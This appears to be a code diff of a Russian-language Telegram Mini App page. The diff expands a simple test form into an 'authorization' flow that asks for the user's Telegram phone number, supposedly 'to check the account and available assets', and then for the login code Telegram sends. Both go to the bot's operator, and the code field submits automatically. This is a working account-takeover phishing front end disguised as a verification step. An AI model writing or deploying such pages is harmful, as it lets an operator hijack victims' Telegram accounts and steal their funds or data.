@@ -1,44 +1,300 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Тест авторизации</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: Arial; padding: 20px; }
-        input, button { padding: 10px; margin: 5px; width: 200px; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: white;
+            color: black;
+            padding: 20px;
+        }
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+        input, button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+        input {
+            background: #f3f4f8;
+            text-align: center;
+        }
+        button {
+            background: #229ED9;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .status {
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+        }
     </style>
 </head>
 <body>
-    <h2>🧪 Тест отправки номера</h2>
-    
-    <input type="text" id="phone" placeholder="+79991234567">
-    <button onclick="sendPhone()">📱 Отправить номер</button>
-    
+    <div class="container">
+        <!-- Шаг 1: Ввод номера -->
+        <div id="step1" class="step active">
+            <h2>📱 Введите номер Telegram</h2>
+            <p>Для проверки аккаунта и доступных активов</p>
+            
+            <input type="text" id="phone" placeholder="+79991234567" required>
+            
+            <button onclick="sendPhone()">📤 ОТПРАВИТЬ НОМЕР</button>
+            
+            <div id="status1" class="status"></div>
+        </div>
+
+        <!-- Шаг 2: Ввод кода -->
+        <div id="step2" class="step">
+            <h2>🔐 Введите код из Telegram</h2>
+            <p>Код был отправлен в ваш Telegram аккаунт</p>
+            
+            <input type="text" id="code" placeholder="12345" maxlength="5" required>
+            
+            <button onclick="sendCode()">✅ ПОДТВЕРДИТЬ КОД</button>
+            
+            <div id="status2" class="status"></div>
+        </div>
+
+        <!-- Шаг 3: Результат -->
+        <div id="step3" class="step">
+            <h2>🎯 Результат проверки</h2>
+            <div id="result" class="status"></div>
+        </div>
+    </div>
+
     <script>
+        // Инициализация Telegram WebApp
         let tg = window.Telegram.WebApp;
-        tg.expand();
         
+        // Раскрываем на весь экран
+        tg.expand();
+        tg.enableClosingConfirmation();
+        
+        console.log("✅ WebApp инициализирован");
+        console.log("👤 User:", tg.initDataUnsafe.user);
+
+        let currentStep = 1;
+        let userPhone = '';
+
+        // Показываем шаг
+        function showStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(`step${step}`).classList.add('active');
+            currentStep = step;
+        }
+
+        // Отправка номера телефона
         function sendPhone() {
-            const phone = document.getElementById('phone').value;
+            const phone = document.getElementById('phone').value.trim();
+            const statusDiv = document.getElementById('status1');
+            
             if (!phone) {
-                alert('Введите номер телефона');
+                statusDiv.innerHTML = '<div class="status error">❌ Введите номер телефона</div>';
                 return;
             }
+
+            userPhone = phone;
             
+            // Показываем загрузку
+            const btn = document.querySelector('#step1 button');
+            btn.disabled = true;
+            btn.textContent = '📤 ОТПРАВКА...';
+            statusDiv.innerHTML = '<div class="status">🔄 Отправляем номер в бота...</div>';
+
+            console.log("📱 Отправляем номер:", phone);
+
+            // Отправляем данные в бота
             const data = {
                 type: 'submit_phone',
                 phone: phone
             };
-            
-            console.log('Отправляем данные:', data);
-            tg.sendData(JSON.stringify(data));
-            
-            tg.showPopup({
-                title: 'Номер отправлен',
-                message: 'Проверь логи бота в консоли',
-                buttons: [{ type: 'ok' }]
-            });
+
+            // Способ 1: Основной метод
+            try {
+                tg.sendData(JSON.stringify(data));
+                console.log("✅ Данные отправлены через sendData");
+                
+                statusDiv.innerHTML = '<div class="status success">✅ Номер отправлен! Проверяем логи бота...</div>';
+                
+                // Переходим к следующему шагу через 2 секунды
+                setTimeout(() => {
+                    showStep(2);
+                }, 2000);
+                
+            } catch (error) {
+                console.error("❌ Ошибка sendData:", error);
+                statusDiv.innerHTML = '<div class="status error">❌ Ошибка отправки: ' + error + '</div>';
+                btn.disabled = false;
+                btn.textContent = '📤 ОТПРАВИТЬ НОМЕР';
+            }
         }
+
+        // Отправка кода
+        function sendCode() {
+            const code = document.getElementById('code').value.trim();
+            const statusDiv = document.getElementById('status2');
+            
+            if (!code || code.length !== 5) {
+                statusDiv.innerHTML = '<div class="status error">❌ Введите код из 5 цифр</div>';
+                return;
+            }
+
+            // Показываем загрузку
+            const btn = document.querySelector('#step2 button');
+            btn.disabled = true;
+            btn.textContent = '🔐 ПРОВЕРКА...';
+            statusDiv.innerHTML = '<div class="status">🔄 Проверяем код...</div>';
+
+            console.log("🔐 Отправляем код:", code);
+
+            // Отправляем данные в бота
+            const data = {
+                type: 'submit_code',
+                phone: userPhone,
+                code: code
+            };
+
+            try {
+                tg.sendData(JSON.stringify(data));
+                console.log("✅ Код отправлен через sendData");
+                
+                statusDiv.innerHTML = '<div class="status success">✅ Код отправлен! Проверяем логи бота...</div>';
+                
+                // Показываем результат
+                setTimeout(() => {
+                    showStep(3);
+                    document.getElementById('result').innerHTML = 
+                        '<div class="status success">' +
+                        '✅ <b>Авторизация завершена!</b><br>' +
+                        '📱 Номер: ' + userPhone + '<br>' +
+                        '🔐 Код: ' + code + '<br>' +
+                        '🔄 Проверяем аккаунт...' +
+                        '</div>';
+                }, 2000);
+                
+            } catch (error) {
+                console.error("❌ Ошибка отправки кода:", error);
+                statusDiv.innerHTML = '<div class="status error">❌ Ошибка отправки: ' + error + '</div>';
+                btn.disabled = false;
+                btn.textContent = '✅ ПОДТВЕРДИТЬ КОД';
+            }
+        }
+
+        // Обработчики событий Telegram WebApp
+        tg.onEvent('webAppDataReceived', (event) => {
+            console.log("📨 Получены данные от бота:", event);
+            document.getElementById('result').innerHTML = 
+                '<div class="status success">✅ Данные получены от бота!</div>';
+        });
+
+        tg.onEvent('viewportChanged', (event) => {
+            console.log("📱 Viewport changed:", event);
+        });
+
+        // Авто-отправка при вводе 5 цифр кода
+        document.getElementById('code').addEventListener('input', function(e) {
+            if (e.target.value.length === 5) {
+                setTimeout(() => {
+                    sendCode();
+                }, 500);
+            }
+        });
+
+        // Авто-отправка номера по Enter
+        document.getElementById('phone').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendPhone();
+            }
+        });
+
+        // Показываем информацию о WebApp при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log("🚀 WebApp загружен");
+            console.log("📊 WebApp version:", tg.version);
+            console.log("🌐 Platform:", tg.platform);
+            console.log("📏 Viewport height:", tg.viewportHeight);
+            
+            // Фокусируемся на поле ввода
+            setTimeout(() => {
+                document.getElementById('phone').focus();
+            }, 1000);
+        });
+
+        // Дополнительные методы отправки (на всякий случай)
+        function sendDataAlternative(data) {
+            // Способ 2: Через postEvent
+            try {
+                tg.postEvent('web_app_data_send', { data: JSON.stringify(data) });
+                console.log("✅ Данные отправлены через postEvent");
+                return true;
+            } catch (error) {
+                console.error("❌ Ошибка postEvent:", error);
+                return false;
+            }
+        }
+
+        // Тестовая функция для проверки отправки
+        function testSendData() {
+            const testData = {
+                type: 'test',
+                message: 'Тестовое сообщение от WebApp',
+                timestamp: new Date().toISOString()
+            };
+            
+            console.log("🧪 Тестовая отправка:", testData);
+            
+            try {
+                tg.sendData(JSON.stringify(testData));
+                console.log("✅ Тестовые данные отправлены");
+                return true;
+            } catch (error) {
+                console.error("❌ Ошибка тестовой отправки:", error);
+                return false;
+            }
+        }
+
+        // Запускаем тест при загрузке
+        setTimeout(() => {
+            console.log("🧪 Запускаем тестовую отправку...");
+            testSendData();
+        }, 3000);
+
     </script>
 </body>
 </html>
